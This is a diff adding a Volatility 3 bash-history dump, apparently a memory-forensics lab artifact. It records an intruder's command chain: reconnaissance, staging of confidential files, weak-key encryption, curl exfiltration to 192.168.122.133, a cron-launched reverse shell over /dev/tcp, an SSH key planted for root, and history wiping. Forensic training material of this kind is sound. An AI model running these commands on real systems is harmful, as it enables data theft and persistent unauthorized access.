@@ -1,0 +1,45 @@
+Volatility 3 Framework 2.28.1
+
+PID	Process	CommandTime	Command
+
+1029	bash	2026-04-30 11:00:15.000000 UTC	w
+1029	bash	2026-04-30 11:00:15.000000 UTC	rm -rf /tmp/.backup
+1029	bash	2026-04-30 11:00:15.000000 UTC	XDG_RUNTIME_DIR=/run/user/0
+1029	bash	2026-04-30 11:00:15.000000 UTC	mv /opt/quantum_lab /tmp/.backup/ 
+1029	bash	2026-04-30 11:00:15.000000 UTC	rm -rf /tmp/.backup
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -la /tmp/ | grep -E 'encrypted|system_update'
+1029	bash	2026-04-30 11:00:15.000000 UTC	mv /home/rcap/Documents/2026_04_18-Rapport_Confidentiel.pdf /tmp/.backup/ 
+1029	bash	2026-04-30 11:00:15.000000 UTC	id
+1029	bash	2026-04-30 11:00:15.000000 UTC	ps aux | grep -E 'apache|mysql|ssh'
+1029	bash	2026-04-30 11:00:15.000000 UTC	uname -a
+1029	bash	2026-04-30 11:00:15.000000 UTC	export ENCRYPT_KEY=$(printf '%x' $(date +%s))
+1029	bash	2026-04-30 11:00:15.000000 UTC	mkdir -p /root/.ssh
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -la /opt/
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -lh /tmp/.encrypted_data.enc
+1029	bash	2026-04-30 11:00:15.000000 UTC	(crontab -l 2>/dev/null; echo '*/5 * * * * /opt/.system_update') | crontab -
+1029	bash	2026-04-30 11:00:15.000000 UTC	exit
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -lh /tmp/.encrypted_data.enc
+1029	bash	2026-04-30 11:00:15.000000 UTC	exit
+1029	bash	2026-04-30 11:00:15.000000 UTC	echo 'bash -i >& /dev/tcp/192.168.122.133/4444 0>&1' >> /opt/.system_update
+1029	bash	2026-04-30 11:00:15.000000 UTC	echo '#!/bin/bash' > /opt/.system_update
+1029	bash	2026-04-30 11:00:15.000000 UTC	cat /etc/passwd | grep /home
+1029	bash	2026-04-30 11:00:15.000000 UTC	echo $ENCRYPT_KEY
+1029	bash	2026-04-30 11:00:15.000000 UTC	chmod 600 /root/.ssh/authorized_keys
+1029	bash	2026-04-30 11:00:15.000000 UTC	find /opt /home -type f \( -iname '*confidentiel*' -o -iname '*secret*' -o -iname '*password*' \) 2>/dev/null
+1029	bash	2026-04-30 11:00:15.000000 UTC	curl -X POST -H 'Content-Type: application/octet-stream' --data-binary @/tmp/.encrypted_data.enc http://192.168.122.133:8080/upload 2>&1
+1029	bash	2026-04-30 11:00:15.000000 UTC	openssl enc -aes-256-cbc -salt -in /tmp/.backup/data.tar.gz -out /tmp/.encrypted_data.enc -k $ENCRYPT_KEY
+1029	bash	2026-04-30 11:00:15.000000 UTC	cd /tmp/.backup && tar czf data.tar.gz * 2>/dev/null
+1029	bash	2026-04-30 11:00:15.000000 UTC	echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl8fmPvF2R3R8MEYo3Hw3Jh1U4PFCXNtVhyMRDwtIDpzAqeSNpo4KLry8EjxSOOCiCCxn2ndJ0lTmbVP93R1zVnJjntw5ND3LROlmzXri+7pAbMTuLdTrArvR5ib3WJj/5SSGoGLDI8tuInMv9tPCN0aWw0uu9GoQ15cGZMq1/lEOc95M/9ixpDFCtxOTmrvn0Nivey76IeweR0+jBpxsooROIt1/hQ/XJ29m47xXd+8pkVCmx9XekDm7HoZzfmQZvefReMk5fn/qeOUQ8p+7IYqDyKuEbVPwrCVcf3D3Qc3qFDtyauDaJcFGe3EWXiVRFudpGuzgJJMYe618/cw1X root@ch4t' >> /root/.ssh/authorized_keys
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -lh /tmp/.backup/
+1029	bash	2026-04-30 11:00:15.000000 UTC	mkdir -p /tmp/.backup
+1029	bash	2026-04-30 11:00:15.000000 UTC	chmod 700 /root/.ssh
+1029	bash	2026-04-30 11:00:15.000000 UTC	exit
+1029	bash	2026-04-30 11:00:15.000000 UTC	chmod +x /opt/.system_update
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -la /home/
+1029	bash	2026-04-30 11:00:15.000000 UTC	netstat -tulpn | grep LISTEN
+1029	bash	2026-04-30 11:00:15.000000 UTC	crontab -l
+1029	bash	2026-04-30 11:00:15.000000 UTC	exit
+1029	bash	2026-04-30 11:00:15.000000 UTC	whoami
+1029	bash	2026-04-30 11:00:15.000000 UTC	ls -la /opt/quantum_lab/
+1029	bash	2026-04-30 11:00:18.000000 UTC	unset HISTFILE
+1029	bash	2026-04-30 11:00:20.000000 UTC	./capture_memory.sh 
